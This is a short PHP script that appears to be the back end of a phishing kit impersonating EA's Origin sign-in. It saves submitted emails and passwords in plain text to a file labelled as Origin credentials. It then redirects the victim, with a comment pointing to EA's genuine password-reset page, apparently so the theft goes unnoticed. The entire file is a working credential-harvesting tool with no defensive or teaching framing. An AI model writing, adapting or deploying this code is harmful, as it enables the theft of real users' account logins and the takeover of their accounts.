<?php

file_put_contents("usernames.txt", "Origin Username: " . $_POST['email'] . "\nPassword: " . $_POST['password'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://signin.ea.com/p/originX/resetPassword?execution=e1430406479s1
header("Location: $url");
exit();
?>